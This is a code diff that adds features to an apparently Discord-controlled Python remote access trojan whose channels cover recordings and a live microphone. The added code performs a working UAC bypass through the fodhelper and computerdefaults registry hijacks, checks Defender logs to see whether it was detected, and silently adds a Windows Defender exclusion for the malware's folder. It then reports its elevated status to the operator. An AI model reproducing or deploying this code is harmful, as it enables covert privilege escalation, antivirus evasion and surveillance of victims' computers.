@@ -29,6 +29,49 @@ import asyncio
 import sys
 import os
 import time
+import ctypes
+
+def UACbypass(method: int = 1) -> bool:
+    if GetSelf()[1]:
+        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
+        match method:
+            case 1:
+                execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+                execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+                log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                execute("computerdefaults --nouacbypass")
+                log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+                if log_count_after > log_count_before:
+                    return UACbypass(method + 1)
+            case 2:
+                execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+                execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+                log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                execute("fodhelper --nouacbypass")
+                log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+                if log_count_after > log_count_before:
+                    return UACbypass(method + 1)
+            case _:
+                return False
+        return True
+
+def IsAdmin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
+
+def GetSelf() -> tuple[str, bool]:
+    if hasattr(sys, "frozen"):
+        return (sys.executable, True)
+    else:
+        return (__file__, False)
+
+
+if not IsAdmin():
+    if GetSelf()[1]:
+        if UACbypass():
+                os._exit(0)
+
 auto = 'auto'
 
 #
@@ -64,6 +107,13 @@ secret_key = ''                                                    ##
 guild_id = auto                                                    ##
 ## If you like this project, please leave me a Star on GitHub ;)   ##
 #####################################################################
+
+if IsAdmin():
+    exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
+    for path in exclusion_paths:
+        try:
+            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], creationflags=subprocess.CREATE_NO_WINDOW)
+        except: pass
 
 client = discord.Client(intents=discord.Intents.all())
 # [pysilon_var] !opus_initialization 0
@@ -143,7 +193,11 @@ async def on_ready():
             elif channel.name == 'recordings': channel_ids['recordings'] = channel.id
             elif channel.name == 'Live microphone': channel_ids['voice'] = channel.id
 
-    await client.get_channel(channel_ids['main']).send('_ _\n_ _\n_ _```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```\n_ _\n_ _\n_ _')
+    if IsAdmin():
+        await client.get_channel(channel_ids['main']).send('_ _\n_ _\n_ _```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + ' (Bypassed UAC!)' + '```\n_ _\n_ _\n_ _')
+    else:
+        await client.get_channel(channel_ids['main']).send('_ _\n_ _\n_ _```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```\n_ _\n_ _\n_ _')
+
 
 # [pysilon_var] !recording_startup 1
     
